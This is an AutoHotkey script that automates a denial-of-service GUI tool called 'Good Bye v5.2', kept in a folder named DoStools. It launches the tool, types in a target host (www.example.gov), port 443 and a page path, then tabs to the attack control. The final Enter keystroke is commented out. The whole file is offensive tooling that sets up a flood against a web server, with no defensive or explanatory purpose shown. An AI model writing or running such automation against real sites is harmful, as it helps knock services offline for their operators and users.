#CommentFlag //

// ------------------------------------------------
// CONFIG
// ------------------------------------------------

goodbye_path = C:\DoStools\Good Bye v5.2.exe
target_url = www.example.gov
target_uri = /index.html
target_port = 443	

// ------------------------------------------------
// MAIN SCRIPT
// ------------------------------------------------

// Execute ByteDOS
Run, %goodbye_path%

// Give focus to GoodBye window
WinActivate, Good Bye v5.2
WinWaitActive, Good Bye v5.2

// Target URL
Loop 10 {
	Send {Del}
}
SendInput, %target_url%

// Target port
Send {TAB}
Send {Del}
Send {Del}
SendInput %target_port%

// Target URI
Send {TAB}
Send {TAB}
Send {TAB}
Loop 10 {
	Send {Del}
}
SendInput %target_uri%

// Execute attack
Loop 15 {
	Send {TAB}
}
//Send {Enter}